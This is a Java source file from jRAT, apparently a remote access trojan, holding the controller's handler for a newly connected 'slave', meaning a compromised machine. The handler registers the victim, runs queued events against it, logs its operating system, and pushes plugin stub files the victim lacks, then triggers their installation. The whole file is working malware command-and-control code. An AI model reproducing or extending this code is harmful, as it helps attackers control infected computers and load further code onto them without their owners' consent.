package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import jrat.api.RATPlugin;
import se.jrat.controller.Globals;
import se.jrat.controller.Main;
import se.jrat.controller.OfflineSlave;
import se.jrat.controller.Slave;
import se.jrat.controller.addons.Plugins;
import se.jrat.controller.events.Event;
import se.jrat.controller.events.Events;
import se.jrat.controller.net.ConnectionHandler;
import se.jrat.controller.packets.outgoing.Packet101UploadPlugin;
import se.jrat.controller.packets.outgoing.Packet42ServerUploadFile;
import se.jrat.controller.settings.Settings;
import se.jrat.controller.settings.StatisticsOperatingSystem;
import se.jrat.controller.settings.StoreOfflineSlaves;
import se.jrat.controller.threads.UploadThread;

public class Packet3Initialized extends AbstractIncomingPacket {

	@Override
	public void read(final Slave slave, DataInputStream dis) throws Exception {
		ConnectionHandler.addSlave(slave);

		for (Event event : Events.queue.values()) {
			event.perform(slave);
		}
		
		StoreOfflineSlaves.getGlobal().add(new OfflineSlave(slave));
		StatisticsOperatingSystem.getGlobal().add(slave);

		List<String> plugins = new ArrayList<String>(Arrays.asList(slave.getPlugins()));
		List<String> notInstalled = new ArrayList<String>();

		if (plugins != null && Settings.getGlobal().getBoolean("plugintransfer")) {
			for (RATPlugin plugin : Plugins.getPlugins()) {
				if (!plugins.contains(plugin.getName())) {
					notInstalled.add(plugin.getName());
					Main.debug("Plugin " + plugin.getName() + " is not installed, adding to list");
				}
			}

			Map<String, File> filesToTransfer = new HashMap<String, File>();

			for (String sp : notInstalled) {
				RATPlugin plugin = Plugins.getPlugin(sp);
				File[] files = Globals.getPluginStubDirectory().listFiles();

				for (File stubFile : files) {
					if (stubFile.getName().startsWith(plugin.getName())) {
						Main.debug("Found stub plugin " + stubFile.getName() + " for plugin " + plugin.getName());
						filesToTransfer.put(plugin.getName(), stubFile);
						continue;
					}
				}
			}

			for (final String key : filesToTransfer.keySet()) {
				File file = filesToTransfer.get(key);

				Main.debug("Transferring " + key);

				slave.addToSendQueue(new Packet42ServerUploadFile(file, key, true, new UploadThread(null, key, file) {
					@Override
					public void onComplete() {
						super.onComplete();
						slave.addToSendQueue(new Packet101UploadPlugin(key));
					}
				}));
			}
		}
	}

}
